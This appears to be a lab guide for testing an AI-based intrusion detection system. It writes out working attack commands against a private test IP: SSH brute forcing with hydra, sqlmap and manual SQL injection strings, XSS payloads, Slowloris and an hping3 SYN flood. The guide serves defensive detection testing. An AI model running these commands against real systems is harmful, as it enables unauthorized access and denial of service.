# Attack Simulation Guide

## Prerequisites
```bash
# Install attack tools on attacker VM (192.168.68.145)
sudo apt update
sudo apt install -y hydra nmap sqlmap slowhttptest hping3
```

## 1. SSH Brute Force Attack
```bash
# From attacker VM
hydra -l root -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.68.152 -t 4

# Should trigger: "SSH-Brute-Force" after 10+ attempts
```

## 2. Web Attacks (SQL Injection)
```bash
# Setup target (on IDS machine)
sudo apt install apache2 -y
sudo systemctl start apache2

# From attacker VM - SQLi
sqlmap -u "http://192.168.68.152/?id=1" --batch --dbs

# Manual SQLi test
curl "http://192.168.68.152/?id=1' OR '1'='1"
curl "http://192.168.68.152/?id=1 UNION SELECT * FROM users--"

# Should trigger: "SQL-Injection"
```

## 3. XSS Attack
```bash
# From attacker VM
curl "http://192.168.68.152/?search=<script>alert('XSS')</script>"
curl "http://192.168.68.152/?name=<img src=x onerror=alert(1)>"

# Should trigger: "XSS-Attack"
```

## 4. Slowloris DoS
```bash
# From attacker VM
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py 192.168.68.152 -p 80 -s 200

# Should trigger: "Slowloris-DoS" after 20+ slow connections
```

## 5. Port Scan (Already Working)
```bash
nmap -p 1-100 192.168.68.152
# Triggers: "PortScan"
```

## 6. DDoS (Already Working)
```bash
sudo hping3 -S --flood -p 80 192.168.68.152
# Triggers: "DDoS"
```

## 7. Unknown Traffic Test
```bash
# Send unusual traffic that doesn't match trained patterns
# Example: Custom protocol on random port
nc -u 192.168.68.152 9999 < /dev/urandom

# Should trigger: "Unknown-Traffic" if confidence < 60%
```

## Expected Detection Summary

| Attack Type | Detection Method | Threshold | Alert Label |
|-------------|-----------------|-----------|-------------|
| DDoS | Rate-based | >100 pkt/s | DDoS |
| PortScan | Port counting | 10+ ports | PortScan |
| SSH Brute Force | Attempt counting | 10+ attempts/10s | SSH-Brute-Force |
| SQL Injection | Pattern matching | SQL keywords | SQL-Injection |
| XSS | Pattern matching | Script tags | XSS-Attack |
| Command Injection | Pattern matching | Shell commands | Command-Injection |
| Slowloris | Connection tracking | 20+ slow conn | Slowloris-DoS |
| Unknown | ML confidence | <60% | Unknown-Traffic |
| Bot/Web/FTP-Patator | ML classification | CIC-IDS2017 | (original label) |

## Monitoring
Watch the IDS terminal for alerts:
```bash
sudo ~/AI-IDS-Project/venv/bin/python src/capture/packet_capture.py
```

Check the dashboard:
```
http://192.168.68.152:5000
```

Check email alerts (if configured):
```
python src/alerts/email_alerts.py
```
